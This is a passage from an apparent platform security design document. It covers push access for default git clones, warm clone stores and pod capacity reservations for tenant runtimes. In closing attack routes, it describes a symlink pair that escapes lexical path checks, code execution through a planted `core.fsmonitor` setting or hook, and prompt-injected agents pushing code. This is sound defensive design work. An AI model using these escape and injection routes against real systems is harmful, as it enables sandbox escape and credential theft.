The client of a default clone may not know the repository's name, because a tenant admin declared it on the runtime. A client-side `writableRepositories` entry therefore cannot be the only route to push access. `auth.leaseScope` stays a read scope in every case, and `write` is a separate field.

| `write` | Which sessions can push | What the client states | What it needs |
| :-- | :-- | :-- | :-- |
| `none`, the default | None through this field. A client that knows the name can still declare it in `writableRepositories`. | Nothing | `allowGitClones` |
| `clientOptIn` | A session whose plan sets `writeDefaultClones: true` | One flag, which names no repository and covers every `clientOptIn` clone on the runtime | `allowGitClones` |
| `always` | Every session on the runtime | Nothing. A transparent client sends no plan, so this is its only route to push access | `allowGitCloneWrites` in the grant, off by default, `allowedRefPatterns` on the clone, and a pool with no `prAuthoring: user` |

**At write.** A `write` value other than `none` carries these conditions, each answering `422 INVALID_DERIVED_RUNTIME`:

- The clone carries `auth`, and its repository lies under a VCS pool prefix whose pool sets `allowWrite`.
- "One session per pod" above applies.
- `write: always` carries `allowedRefPatterns`, each a literal prefix under `refs/heads/` with at least one named segment, such as `refs/heads/lenny/*`. With no client statement, a prompt-injected agent in any session would otherwise reach the default branch.
- `write: always` is refused under a pool with `prAuthoring: user`. A writable entry there attaches the user's binding, which `user-git-identity-design.md` states can give the agent the user's whole API power on some providers, and that needs a statement from the client. `clientOptIn` is that statement, and its write answers with a `Warning` naming the attach.
- `derivedRuntimes.forbid` allows it: `writableDefaultClones` refuses both values, and `alwaysWritableClones` refuses `always` alone.

**At bind.** Composition first settles whether the value applies to this session, under the rules below, and only then adds the repository to the stored plan's `writableRepositories`, with the clone's patterns. A clone that reads as read-only therefore triggers no attach. An added entry is an ordinary writable entry: the allowlist and `allowWrite` checks, the `required` check, the attach rule of `prAuthoring`, `netagent`'s enforcement, and `git.operation` records all apply, and `GET /v1/sessions/{id}` shows it. A user with no link on a `clientOptIn` clone under `prAuthoring: user` gets `USER_LINK_REQUIRED`, because the client asked for the write.

- **A user who can read and not write.** The session continues read-only, and its response lists `readOnlyDefaultClones` with each clone's `path` and a reason, omitting the repository's name. The client did not name the repository, and the read is what the runtime needs. A repository the client itself names in `writableRepositories` keeps the refusal `user-git-identity-design.md` states. The same rule covers an `allowWrite` lowered after the write, a `pendingApproval` entry, and an `always` clone whose pool later turns on `prAuthoring: user`.
- **A delegated child.** A child gets write access under `clientOptIn` or `always` only when its parent's writable set holds the same repository and any `allowedRefPatterns` on the clone lie within the parent's entry, and it is read-only otherwise, in any environment. A clone with no patterns takes the parent's entry's, so a parent limited to `refs/heads/alice/*` cannot delegate a push to `main`. A read-only parent could otherwise delegate to a runtime with `write: always` and push through it.
- **A derive.** A derive composes nothing, so it copies the source's writable entries, under `session-derive-design.md`. An entry a default clone added follows this rule on the new session, so it reads as read-only on a target that reuses pods, and when its pool has since turned on `prAuthoring: user`.
- **An experiment.** `variant.Runtime` brings its `write` values, so an experiment can add push access to the sessions it assigns. An experiment write naming such a runtime answers with a `Warning`.

### Derive

`session-derive-design.md` states derive for every session, and decision 22 below records the owner's choice. These parts concern default clones:

- A derive copies the source's stored plan, so a default clone travels as a `gitClone` source marked `runtimeDefault`, and the target's clones do not compose. A tenant's later change to the runtime reaches no derived session.
- `from: latest` restores the snapshot and clones nothing. A snapshot archives the whole workspace, and `ArchiveTree` excludes no `.git`, so it holds a clone's commit, local commits, index, and uncommitted changes, whether the source could write or not. A warm clone's snapshot leaves out the objects its store holds, and restore fetches them, so a commit since removed from the host fails that derive.
- `from: start` clones each repository at the source's `resolvedCommitSha`, and a store on the target serves it where the URL matches.
- Every check under "Binding" runs on the new session's user and environment, so a kept tree does not skip the read check.
- A derive runs the check under "Stops" in that document on `planOriginRuntimes`, and it is refused onto another runtime with no supervisor.

### Environments

A default clone's VCS pool must be visible in the session's environment, and its host must survive that environment's policy. Otherwise the session is refused in that environment. The write's `Warning` lists each admitting environment where the check would refuse. The rule under "Pods with no per-session policy" reads the composed plan, so a concurrent owned pool whose default clone names a scoped repository refuses the session as it would for a client's plan.

### A clone is code

A default clone reaches an exempt base command and the runtime's workspace configuration as a default file does. `allowGitClones` therefore has the conditions of `allowWorkspaceFiles`: a supervised base, and DR-3 landed.

A clone adds one risk a file does not have. Whoever can push to the named ref runs code at the agent UID in every new session on that runtime, and Lenny records no write by that person. A default file changes only through a tenant admin's audited write. A full commit removes this risk, and `derivedRuntimes.forbid: floatingCloneRefs` requires one. Each session's stored `resolvedCommitSha` records what it ran.

### Materialization and cost

A default clone without `warm` is fetched whole at materialization, after the pod is claimed, and a clone with `warm` fetches the difference from its store, as "Warm clones" states. A tenant's `sharedAssets` stays refused. A tenant admin also avoids a slow first fetch through the mirror prefetch resource `egress-and-git-design.md` defines.

- A floating ref adds an `ls-refs` call per session create and makes create depend on the egress path. A full commit avoids both.
- The composed plan counts toward §7.1 **Bind bounds.**, and the pool's fetch retry window covers every clone of a plan together, so defaults use up a client's share of each.
- `egress-and-git-design.md` refuses a runtime write that raises the setup bound past what a pool's window admits, and a tenant's `setupPolicy.timeoutSeconds` is such a write. The refusal goes to the tenant, on its own write. A template write that raises the window succeeds under DP9, and the owned pool's effective window is the smaller of the copied value and what its setup bound admits.

### Warm clones

`warm: true` fills a default clone's objects on an owned pool's pods before any session, so a session later fetches only the difference between the store's commit and the commit it binds. The store is fetched once per pod and shared read-only by every session on that pod. It holds objects and no working tree. Each session then checks out into its own writable slot at materialization, because each has its own tree and the slot does not exist earlier, and setup commands still run per session. `warm` changes only where the bytes come from: every check under "Binding" runs as it does without it, and the session's commit is still resolved at bind.

**Carrier.** The PoolScalingController renders the owned pool's warm list on `SandboxTemplate.spec.warmClones`, with each entry's normalized `url`, `ref`, and a store directory named by a hash of that URL. The owned pool row copies `maxWarmCloneBytes` from the grant entry, and the template carries it as `warmCloneBytes`. `createPod` encodes the list onto the adapter's flag beside the base's shared assets, and it records the store directories on the Sandbox as `warmStores`. The WarmPoolController also stamps a new `lenny.dev/owner-tenant` Sandbox label, which is what the creation rule under "Bounds" lists by, because `sandboxLabels` holds no owner today and the pin label also appears on a shared pool's pods. A derived runtime has no `Runtime` resource, and `encodeSharedAssets` reads that resource, so 0111's carrier cannot serve here. A CRD field pattern refuses userinfo in the URL as a second gate, as 0111 states for its own field.

**Fill.** Before the pod reports ready, the adapter fills a new bare repository for each entry on a dedicated `emptyDir`, `lenny-warm-clones`, which the adapter mounts read-write and the runtime container mounts read-only at `/workspace/warm-clones`. It ignores hooks and repository configuration, and it fetches through `netagent` on the session git path, because the owner's label is on the pod from creation. The store records its commit, resolved from a floating ref or fetched by SHA for a full one, as its only ref, because git offers an alternate's ref tips as haves. The store is immutable from then on.

- **Size.** The volume's `sizeLimit` is `warmCloneBytes`, and the adapter container's ephemeral storage request grows by that value, added after `applyResources`, which otherwise copies one request to every container and would multiply it. The scheduler and the quota then count it. The adapter ends a fill that passes the limit, `sizeLimit` is the second line, and a breach evicts this pod alone. 0111 leaves stores unsized because an operator writes them, and a tenant's input cannot leave node storage unsized.
- **Share of the quota.** Resource classes set CPU and memory alone today, so warm pods are effectively the only requesters against `lenny-agent-storage-quota`, and one grant could use it all and leave other tenants' pods refused. A grant write that raises the sum across grants of `maxOwnedPods` times the entry's largest `maxWarmCloneBytes` is refused above `warmClones.totalBytes`, under the grant lock, and preflight compares that total with the storage quota. Any other grant write passes, including an emergency `retireAt`, so a lowered Helm value blocks only raises, and `GET` reports the excess. Pods created before a lowering hold their requests until they end. A reservation does not hold against storage, as DR-10 states.
- **Checkout.** A commit the store holds causes no fetch, so the fetch cap does not bound what a checkout writes, and a small pack can expand far past its size, because a tree can reuse subtrees. Before every checkout, the adapter streams the tree's listing under a git directory of its own, and it stops and refuses with `UPLOAD_ARCHIVE_LIMIT_EXCEEDED` at the first of `workspaceSizeLimitBytes`, `adapter.maxCloneTreeEntries`, or a time limit. Each entry is charged as 0111's rule 2 charges it, each blob rounded up to 4,096 bytes plus 128 bytes per entry, and the total runs across the plan's clones, so empty files and repeated subtrees count, and several clones cannot sum past the limit. A clone without a store runs this after its fetch, which the fetch cap bounds. This takes the place of 0111's rule 2 bound, which ran in the gateway's mirror. The egress design's slot `sizeLimit` is the second line, so DR-9 depends on it.
- **Reach before binding.** The decision service and the Token Service read the warm list from the owned pool row. While a pod has no session, its readable set is that list and the base's public `gitRepository` entries alone, and its tokens are read tokens alone, whatever `userAuthorization` says, and a repository off the tenant's allowlist has already left the rendered list. The hosts join the pod's pre-session policy within the ceiling, and a tenant deny still wins, in which case the fill fails and is reported. On a `required` pool the fill uses the App, as "Mirror, warm fills" in `user-git-identity-design.md` states. Repositories on `mint-coarse` and `stored` providers skip the mirror under the egress design's routing rule, so each pod fetches them from the host.
- **Failure.** A fill that fails takes the pod to `failed`, as 0111 states, with no fallback to a ready pod lacking its store. After `warmClones.failureThreshold` consecutive failures of one store, the WarmPoolController backs off creating that pool's pods while that store is on the list, doubling up to 10 minutes, and sets `WarmCloneFillFailing`. `GET` reports `warm.state` and `blockedBy: warmClone` with the clone's `path` and reason to the tenant admin who wrote it. The backoff is keyed by store directory, so removing `warm` from the failing clone is the immediate way out, and a loop of writes cannot reset it.
- **Shared capacity.** The WarmPoolController creates no Sandbox with a warm list while the owner has `warmClones.maxConcurrentFillsPerTenant` pods running a fill, which leaves out a Pending pod, so that another tenant's burst at the quota cannot hold this limit, so one tenant's fills do not take over `lenny-egress`. `controller.tuning.gitStoreFillTimeout` bounds each fill. On a `preConnect` template the fill also runs under `sdkConnectTimeoutSeconds`, which the template sets, and a write on such a pool answers with a `Warning`.

**Session.** Materialization follows 0111's rule 3, as `egress-and-git-design.md` rewrites its transport. The adapter runs `git init` in a new directory, writes the store's objects directory to `objects/info/alternates` as an absolute path, fetches `resolvedCommitSha` through `netagent` unless it is already reachable, checks it out detached, and moves the result under "Not verified" below. A tenant's store serves only a source a default clone composed, which `runtimeDefault` marks, so a client's source of the same URL takes the ordinary path and never becomes a repository the plan does not cover at restore. A new session on a pod with no store for the URL fetches that commit shallow, as 0111's fallback does, with no alternates. `warm` changes where the bytes come from, and a tree from a shallow fetch has no history before its commit, which `depth` already allows a client to choose. A commit the store already holds needs no network, so `netagent` sees no request for it, and the bind checks are the only gate on that read. That is why the host, prefix, and `required` checks run at bind on every path, including for a full commit.

**Who reaches a store.** The warm list is a subset of the runtime's default clones. A new session composes all of them, and a resume, retry, or rebuild checks any warm clone the stored plan omits, as "Binding" states, so a session reaches a store only after passing that repository's checks, before it holds the pod. A session whose environment or user fails them never claims. Each claim request carries `coveredStores`, the store directories of every default clone those checks read: the composed plan's, computed from the stored plan on a path that claims in a later call, such as `MaterializeDelegatedChild`, the routed runtime's on a create with no plan, and on a resume, retry, or rebuild, the plan's together with the warm clones it omits. A pod whose `warmStores` lie outside that set is refused, inside the row lock on the Postgres-backed fallback, so a change between the checks and the claim cannot put a session on a store it was not checked for. A pod claimed at create stays with its session through finalize, because the create's checks covered what it holds. The store is readable from every slot on the pod with its whole history up to its commit, which the read scope already covers.

**Reused pods.** The owner allowed `warm` on a pool that reuses pods, by concurrency or by recycling, in the words "go with your recommendations". `ClaimSlot`'s first pass and `rebindReserved` place a session on a running or held pod with no claim check, so `coveredStores` does not reach them. A repository removed from the runtime or off the allowlist therefore stays readable to new sessions on such a pod until it retires, under `maxPodUptimeSeconds` or when its last session ends, and the age drain, which acts on idle pods alone, does not reach it either. Such a pool cannot be under `required`, so its sessions already read through the tenant's App, and no per-user check is lost. A write of `warm: true` on such a pool answers with a `Warning` stating this and naming `oneSessionPerPod: true`, and the `Warning` states the missing bound when the template has no `maxPodUptimeSeconds`. A template write that makes a pool holding a warm clone reuse pods states the same in `runtime.base_changed`. Refusing the pod instead would make a new session need a new pod and could hit the tenant's budget until the old pods empty. On a `preConnect` base the runtime process can read a store while the pod has no session. That process is the platform's image, and no tenant file or command exists on the pod at that point.

**Changing the list.** The WarmPoolController drains an idle pod holding a store no longer on the rendered list, which follows a removed clone, a repository off the allowlist, `warm` turned off, and a grant set to 0. A repository leaving the runtime's default clones also has its pods refused at the next claim, through `coveredStores`, at each caller of `AdmitTenantPin`, and that removal always passes. Every other pod stays claimable, because it holds a subset of what the session was checked for. A new clone or a ref change touches no existing pod: new pods fill from the new list, and older pods leave under the age limit. Running sessions keep their stores until they end.

**Age.** A store never refreshes, so the WarmPoolController drains an idle pod whose store is older than `warmClones.maxAgeSeconds`, while fewer than `warmClones.maxConcurrentFillsPerTenant` of the pool's pods are running a fill, whether or not replacements succeed. A failed fill, a Pending pod held at the quota, or a pool at its bound therefore does not stop the drain, and a large pool does not take past the limit by draining in series, so this bounds how long an idle pod holds content a host has since removed or a tenant has since lost access to, and it bounds the delta's growth. It also means an outage at the host longer than the limit empties the pool's warm pods.

**Budget.** A warm pod counts as `warmCount` and a failed one as `unusable`, under "Bounds", with no new figure. A marked pod that has not finished its fill is not `held`, so `TenantReservationUnmet` reports a reservation a failing clone blocks.

**Restore.** A resume onto another pod follows 0111's rules 5 and 6: the capture copy, and restore completion that overwrites alternates without reading the restored file and fetches `lenny.baseCommit` when the pod's store differs. That fetch is shallow first, because a warm repository's history is larger than the slot's `workspaceSizeLimitBytes` by design, and the store holds it outside the slot. Only when 0111's rule 5 listing reports a missing object does the adapter fetch history, capped at the slot's remaining bytes. The capture copy leaves out `lenny.baseCommit` and its ancestors, so that case is an agent that amended or reset the pinned commit. Such a repository on a pod with no store, whose history does not fit, fails that resume, on a resume path that also holds a cold fetch to 30 s. A default clone's repository is in the plan, so that fetch passes the session's readable set. A derived session's clones stay in its plan, so 0111's lineage rule is not needed for default clones. `lenny.gitStoreUrl` is agent-writable, so restore completion fetches only a URL the gateway passes for that bind, which is the plan's repositories and any 0111 lineage authorizes, as `egress-and-git-design.md` states.

### Relationship to draft proposal 0111

For the record, the owner directed that this design build on 0111 and replace it where that makes sense. Draft 0111 is on the branch `draft/0111-warm-workspace`, its status is Draft, and its review did not converge. `egress-and-git-design.md`, "Relationship to proposal 0111 and open findings", already rewrites it around pod-side git and drops `FetchGitPack`, the gateway mirror, and pack serving. This section applies on top of that rewrite.

These parts of 0111 stand for warm clones: a pod-wide read-only bare store filled before ready, one immutable commit, a per-slot repository over alternates that fetches a delta, no worktrees against a store, the capture copy, restore completion, the §13.4 exception that treats an agent-written repository as untrusted, a failed fill taking the pod to `failed`, no setup pre-running, and `ownerTenantId`.

| 0111 | This design, for a default clone | Reason |
| :-- | :-- | :-- |
| A `gitRepository` entry on `Runtime.sharedAssets`, with `gitRef` and `destPath` | `warm: true` on the clone, with no second statement of the URL or ref | A tenant writes no `sharedAssets`, and two statements of one repository can disagree, which would let a store hold a repository no clone's check covers. |
| Encoded from the `Runtime` resource | `SandboxTemplate.spec.warmClones`, from the pool row | A derived runtime has no `Runtime` resource, and DP8 keeps tenant input off cluster-scoped resources. |
| Refuses a 40-hex `gitRef` | Accepts a full commit | Decision 17 makes a full commit the way to remove the pusher risk, and a warm clone should not lose that. |
| A store at `/workspace/shared/{destPath}`, unsized | A dedicated volume with a `sizeLimit` and a matching storage request | An unsized store is an operator's choice. A tenant could fill a node and evict other tenants' pods. |
| A fresher store arrives with a replacement pod, and no pod is replaced for it | Age limit, a drain when a store leaves the list, and claim refusal when a repository leaves the runtime | Tenant repositories change hands, and a removal has to reach idle pods. |
| A failed fill replaces the pod, with no limit | Backoff and a per-tenant fill limit | A tenant's bad URL must not become a loop that costs other tenants. |
| Authorized by `FetchGitPack` from the pool's Runtime | The owned pool's warm list, read by the decision service and the Token Service | The egress design drops the RPC. |
| Rule 2's tree bound, computed in the gateway's mirror | The adapter's size check before checkout | The egress design removes the gateway's mirror. |
| A shallow pack when a store cannot help, at materialization and at restore | A shallow fetch by SHA, and at restore a history fetch within the slot's remaining bytes when a listing finds a missing object | 0111 accepts a failed restore for an amended or reset commit. A tenant's edit makes a store-less pod routine here, so this design narrows that failure to a history that does not fit. |

0111 remains the design for a platform-written `gitRepository` entry on a base. A base with a public entry can sit beside tenant stores, and the adapter prefers the tenant's store for a URL both name. A base with a private entry cannot take a grant entry that allows warm clones. When 0111 is rewritten, it should adopt the full-commit and size rows for its private stores, which have the same exposure. This design does not stage that edit, because the owner has not started proposals.

### Not verified

`egress-and-git-design.md` moves the clone into the pod and does not state how the adapter treats a target directory that already holds files. Under DR-12 every clone names its own subfolder, but default files and earlier sources materialize first and can write into that subfolder, so a non-empty target still has to work. A snapshot's content does not meet a clone on a derive, because `from: latest` clones nothing.

The answer is a security requirement. The adapter runs the clone at its own UID, which holds the service account token. A `.git/config` in the target that sets `core.fsmonitor`, or a hook there, would run tenant-chosen code at that UID, which DR-3 exists to prevent. The `.git` refusal above closes the tenant's route. `egress-and-git-design.md` now states the rule for every clone: the adapter clones into a new empty directory, with hooks and repository configuration ignored, runs all its git work there, including setting `origin`, and only then moves the result to the target. An existing `.git` at the target is replaced as a unit, because the path collision rule works per path and a planted `commondir` or hook would otherwise survive a merge. The adapter runs no git in the target after the move, apart from 0111's capture copy and restore completion, which use a git directory and configuration the adapter creates for each operation, so nothing an agent wrote takes effect.

**Symbolic links.** The move and every other write the materializer makes run at the adapter's UID, into a tree an earlier session's agent may have written. `extractSymlink` and `ValidateSymlinkTarget` check a link's target lexically, so a restored pair such as `a/b/l -> ../..` and `src -> a/b/l/../../other/current/src` passes both and resolves outside the workspace. `overlayTree` and `writeInlineFile` then follow it. Every materializer write, move, and removal therefore opens its path with `openat2` under `RESOLVE_BENEATH | RESOLVE_NO_SYMLINKS`, as `scrub/resolve_linux.go` already does, and a path crossing a link fails the materialization. The writers have this hole today (DF-15, F-13.4.24), so the fix does not wait for this design.

**Warm clone spike, 2026-11-05.** No Go `netagent` exists, so a stand-in for its git path terminated TLS for every host under a per-run CA, re-originated over HTTP/1.1 against public roots, and logged each request's wants and haves. It ran git 2.49.1 against public repositories, anonymously, with the store mounted read-only and each move crossing filesystems.

- GitHub, GitLab.com, Bitbucket Cloud, Codeberg (Forgejo), Gitea.com, sourcehut, kernel.org, and Azure DevOps each served a fetch by SHA of a tip, of a non-tip ancestor with full history, at depth 1, and at depth 12. Azure DevOps answers only protocol v0, and git fell back.
- Over alternates, git's first have was the store's commit on every host, and the fetch of a commit ten commits later moved 13.7 to 482.2 KiB against 87.7 to 12,680.9 KiB with no store. A store whose ref was deleted drew no haves and a full resend on every host, which confirms that the store keeps its commit as a ref.
- A commit the store holds was found and checked out with no fetch. After the move, the absolute alternates path held, `git status` was clean, `fsck --connectivity-only` passed, and a commit succeeded.

Still unverified: a real `netagent`, HTTP/2 between git and `netagent`, a minted credential or private repository, a `required` pool, git on GnuTLS, large repositories and checkout time, and restore through the capture copy and restore completion.

## DR-10: Capacity reservation

### What a reservation holds

`maxOwnedPods` is a ceiling. A tenant holding 20 cannot go above it, and nothing ensures that 20 can start. A reservation is a floor, and three things can take capacity away from one:

| What takes capacity | Control in this design | Holds against it |
| :-- | :-- | :-- |
| A pod ending, which frees its place until a replacement starts | The controller keeps the pool at its floor, counting warm and active pods | The pods that exist. A replacement can wait on the two rows below. |
| Other pools' pods reaching the namespace `ResourceQuota` | The quota is split, and the reserved share is unavailable to other pods | Pod count, CPU, and memory, at quota admission. Ephemeral storage stays shared, as "The quota" states. |
| Other pools' pods filling the nodes | A dedicated node pool, when the operator configures one | Fully with a dedicated pool. Without one, only the pods that exist hold node capacity, and a replacement competes for what is free. |

### Who can turn it on

Every level is off until the level above it allows it.

| Setting | Set by | Effect |
| :-- | :-- | :-- |
| `runtimes.tenantDerivation.reservations.enabled` | Operator (Helm), false by default | While false, the chart renders neither the class nor the split, and a grant cannot allow a reservation. The controller reads the same value, so stored floors stop applying, no pod is marked, `createPod` renders no class on a marked Sandbox with no pod, T stops charging `reservedPods`, and `GET` reports the reservation as `inactive`. Pods already running continue. |
| `runtimes.tenantDerivation.reservations.totalPods`, per resource class | Operator (Helm) | The deployment's reservable total, which sizes the reserved quota. |
| `bases[].maxReservedPods`, per resource class | Platform admin, in the grant | The tenant's allowance, none by default. Across all grants, the allowances for a class stay at or below the total, checked under the lock that grant writes take. Across one grant, all allowances together stay at or below `maxOwnedPods`. |
| `pool.reservedPods` | Tenant admin, or a platform admin writing for the tenant | The floor on one derived runtime's pool, at or below the allowance across the tenant's pools of that base and class. |

The allowance belongs to the tenant, and the tenant divides it among its runtimes, because each pod belongs to one pool and one resource class. A tenant using only shared pools has nothing to reserve, because warm pods on a shared pool have no tenant. A derived runtime with no changes to the base gives such a tenant an owned pool.

Reservations apply in the namespace the PoolScalingController manages (`--agent-namespace`), because the tree has no pool-to-namespace mapping, and a base entry whose template uses another namespace or a `microvm` profile cannot carry an allowance. §17.2 **Node isolation** fixes Kata placement, so this also leaves Kata pods out of the first version.

### Mechanism

**The floor.** The WarmPoolController computes the warm target of an owned pool on each reconcile, from `SandboxWarmPool.spec.reservedPods` and its own Sandbox list, as `max(spec.minWarm, reservedPods - active)`, where `spec.minWarm` is the `warmCount` the PoolScalingController rendered, or 0 under a stop, and passes it to `plan.Compute` as both `MinWarm` and `MaxWarm`. `warmTarget` clamps to `MaxWarm`, so raising `MinWarm` alone would have no effect, and setting both keeps the pinned idle bound at zero, as DR-5 needs. `reconcilePDB` and the pool conditions read the same target, because they read `spec.minWarm` today and a reserved pod would get no disruption budget. `active` counts `claimed` and `reserved` pods, and leaves out `draining` and `failed`, which are unusable. It cannot be computed in the PoolScalingController, which syncs every 30 seconds while the WarmPoolController reacts to Sandbox events at once, because a stale target creates pods the floor does not need. A pool with `reservedPods: 5` and `warmCount: 1` runs 5 warm pods when idle, 2 warm pods with 3 sessions, and 1 warm pod with 5 or more sessions.

The floor applies after the scaling formula, so low demand or a `scaleToZero` window cannot take the pool below it. `resolveWarm` writes `MinWarm: 0` for both a force-zero and a `scaleToZero` window, so the controller cannot tell them apart from that value. The PoolScalingController therefore renders `spec.reservedPods` as 0 on `ForceZeroMinWarm` and when the pool row has `DrainingSince` set, because the `drain` route sets only that column, and as the stored value otherwise. `drainAndDeleteWarmPool` bypasses `syncWarmPool`, so it writes the field itself. A non-empty `warm_stop_reasons` maps to `ForceZeroMinWarm`, so a suspended tenant, a retired base, and a security forbid still drain the pool, and so does the tenant's own experiment pausing its variant pool.

**The quota.** With reservations on, the chart renders, in the `--agent-namespace` alone, a `PriorityClass` named `lenny-reserved`, with value 0 and `preemptionPolicy: Never`, and splits `lenny-agent-quota` through the `PriorityClass` quota scope. A new `lenny-agent-reserved-quota` matches that class and limits `pods` to the sum of `totalPods`. Limiting CPU and memory there would need the total requests of a rendered pod, and `applyResources` stamps a class's requests on every container, so a pod's total depends on its sidecars and RuntimeClass overhead. A limit computed from the class alone would run out at half the stated pods or sooner. The grants and the class sizes bound what those pods request, so a `pods` limit is enough for the reserved share. `lenny-agent-quota` matches every other pod, and it holds the namespace's pod count less `totalPods`, and its CPU and memory less `reservations.reservedRequests`, in which the operator states what to set aside. Kubernetes refuses `requests.ephemeral-storage` under a `PriorityClass` scope (`IsResourceQuotaScopeValidForResource` accepts `pods` and the CPU and memory resources alone), so a third quota, `lenny-agent-storage-quota`, carries it with no scope, at the namespace's value. Other pools can therefore use up storage and refuse a reserved pod, and `TenantReservationUnmet` reports it. An operator sizes that value with the reserved pods included. Nothing in the tree can compute a rendered pod's total, so this figure is the operator's statement, and documentation gives the arithmetic. If it is wrong, the namespace total is misstated, and no reserved pod is refused.

**Which pods are reserved.** `priorityClassName` is immutable, so the WarmPoolController decides when it creates a Sandbox: while the pool has fewer than `reservedPods` non-terminal Sandboxes marked `spec.reserved`, the new one is marked and its pod takes the class. Later pods use the general quota. Two more rules keep the floor:

- The controller drains unmarked idle pods before marked ones.
- `createPod` retries a rejected pod indefinitely, and `plan.Compute` counts that Sandbox as warm. While marked Sandboxes are below `reservedPods`, the controller deletes an unmarked Sandbox in `warming` that has no pod, and creates a marked one. Deleting one that has just created its pod loses only a warming pod, because `claimer.go` claims only `idle` pods. Terminating Sandboxes do not count as marked. Otherwise a full general quota would leave a stuck Sandbox standing in for a pod the reserved quota could start. The planner gains this action, and the rule converges because marks only rise until they reach `reservedPods`.

The controller reads Sandboxes through its cached client, so a stale count can over-mark a pod. The reserved quota then refuses it, and the next reconcile corrects the count.

**Nodes.** A template pool can set `reservedPlacement`, a `nodeSelector` and `tolerations` applied to reserved pods alone. The operator taints that node pool, as §17.2 does for Kata nodes, so that no other pod lands there. The field is platform-written and copied, and the tenant cannot set it. A template write refuses it on a runtime with `workspaceTier: T4`, whose placement `applyT4NodeIsolation` fixes, and refuses a toleration naming the `lenny.dev/isolation` key, which would admit pods to Kata nodes. Without it, `GET` and posture report `placementConfigured: false`. The field states what was configured. Preflight checks that a node carries the selector, and the size of that node pool remains the operator's responsibility.

**No preemption and no priority.** A reserved pod never evicts another pod, and its class has value 0, so it has the priority of every other pod. Agent pods carry no priority class today, so a preempting pod's victims would include other tenants' running sessions, and §28.5.6 states that a preemption bypasses the eviction API and opens no `CH-ADMISSION` channel, so the checks on that channel do not run. A raised value would also cause kubelet node-pressure eviction to prefer other tenants' pods and platform pods over one tenant's idle reserved pods. When nodes are full, a reserved pod waits for free capacity or the cluster autoscaler.

### Budget

`reservedPods` enters the one figure under "Bounds". A pool is charged `reservedPods + warmCount` from the moment the reservation is written, because the warm target keeps `warmCount` warm once sessions have used the reservation. A claim within the reservation leaves T unchanged, so it always passes, and a claim beyond it raises T like any other. With `warmCount` at least 1, a reservation stays below `maxOwnedPods`. The floor is subject to the creation rule under "Bounds", so the bound wins when the two conflict, because R5 protects other tenants.

### Changes after a write

- A grant write lowering an allowance or `maxOwnedPods` lowers allowances and `reservedPods` in the same transaction, in name order, until the allowances and T fit, and `runtime.base_changed` goes out. Excess marked pods that are idle drain, and active ones end with their sessions.
- Those active pods still hold reserved quota. A grant write raising any allowance therefore counts live marked pods above each tenant's allowance, and it is refused while allowances plus that overrun would pass `totalPods`.
- A `totalPods` lowered below what grants allow does not reach the database. Marked pod creation then fails at quota admission, and `PoolScaleoutBlockedByQuota` fires. Preflight compares the two where it can read them.
- `DELETE` releases the runtime's reservation with its pool.

### Reporting

`GET /v1/admin/derived-runtimes/{name}` reports `reservation`, with `requested`, `held`, `state`, `placementConfigured`, and `blockedBy`. A new metric reports requested and held pods per pool, under the cardinality statement in §16, and a `TenantReservationUnmet` alert fires when `held` stays below `requested` past a Helm-set period, whatever the cause, so a refusal at RuntimeClass admission or a missing class is reported as well as a quota refusal. Posture's `gates` section reports the allowance and its use. `lenny_warmpool_idle_pod_minutes` already reports idle pods per pool, so a tenant's reserved idle cost is attributable to it.

### What it costs and what it leaves open

- The reserved share of the quota is unavailable to every other pool, including while a tenant has not used its allowance. This is the operator's cost at the Helm value.
- A dedicated node pool costs idle nodes for the whole reserved total.
- A tenant pays for reserved pods while they sit idle, whether billing reads that or the operator charges another way.
- A node failure reduces `held` until replacements start, and a replacement takes the pod start time. A reservation with no dedicated nodes can wait longer.
- The floor counts pods, and a one-session pool's `reservedPods` equals sessions. A concurrent pool's floor serves more sessions per pod.

## DR-8: Interactions

### Environments

A tenant view runs first, so an environment's `runtimeSelector` only ever sees what the tenant can reach. This also closes the case where `Selector.Matches` with an empty selector admits every registered runtime in the deployment.

`Merge` overlays labels, so a new derived runtime inherits the base's labels and joins every environment whose selector matches them, with its default commands. A write answers with a `Warning` listing the environments that admit it and any `dangerouslyShare` selector that matches it, as `tenant-scoping-identity-design.md` does for its writes. A tenant admin separates a runtime by overriding a label's value or with `exclude`, because the merge cannot remove a base key.

`ENVIRONMENT_REQUIRED` and `ENVIRONMENT_POLICY_NOT_ENFORCEABLE` read the final runtime and pool on the tenant view, under that design's rule for the final row. An owned pool at one session per pod with no recycling evaluates with E's full policy, and so does one with recycling, under the residual that design's decision 5 accepts. An owned pool that keeps a concurrent template's value stays a pod with no per-session policy, and the rule refuses as it does for any such pod. The `Warning` for an environment's first entry gains the name of the template-eligible bases, so a tenant admin learns the route.

### Experiments

Experiments are tenant-scoped, and DR-1 states which pools they can name. An experiment can name the tenant's own derived runtime as `baseRuntime` and an owned pool as a variant. A variant reaches an owned pool by setting `variant.Runtime` to the derived name. `variant.Pool` does not steer an exclusive claim, because `claimAtCreate` resolves with `row.RuntimeRef` and `row.Pool`, and `claimForNewRow` then overwrites `row.PoolRef`. Routing re-checks the variant on the final row, with the checks `tenant-scoping-identity-design.md` already re-runs there and the tenant-view check under "Reading", and the pin refuses another tenant's pod at claim. A grant revoked after the experiment's write therefore stops its sessions and delegated children.

### Delegation

A delegated child's exports are refused on a target with no runtime supervisor, whatever the parent's origins. The refusal reads the routed row, immediately after `ApplyExperimentRouting`, because routing can move a child to another runtime after `materializeExport` has run, and the deferred `undoChildExport` cleans up. DR-4 mirrors `deploymentModel`, which `applyCRDFields` does not read today, and the same helper as `session-derive-design.md` reads it, so DR-8 takes no dependency on DR-6. A prompt-injected parent can otherwise export a `requirements.txt` that an operator's setup command on the child runs at the adapter's UID with the service account token. This costs embedded children their exports, and it applies to every delegation, because the defect exists today (F-8.7.16). A client's own plan file on such a pod is a separate route, which needs the client's authority and which F-7.5.17 records. This closes the setup command route alone. An embedded child runs in the adapter process (§4.7.10), so `task.input` still reaches an agent at the adapter's identity, as any prompt to an embedded runtime does.

`resolveDelegationTarget` and `runtimeAuthorizedForCaller` read through the tenant view with the parent's tenant, so another tenant's name answers `TARGET_NOT_IN_SCOPE`. `runtimeAuthorizedForCaller` returns true on a read error today (F-10.6.23), and a tenant-view miss would reach that branch, so DR-8 depends on TS-3's fail-closed gate. `DelegationPolicy` allow lists are tenant-scoped, and a label or `ids` entry matches a derived runtime as it does any other. Isolation monotonicity applies on the owned pool's copied profile.

### Cross-environment sharing

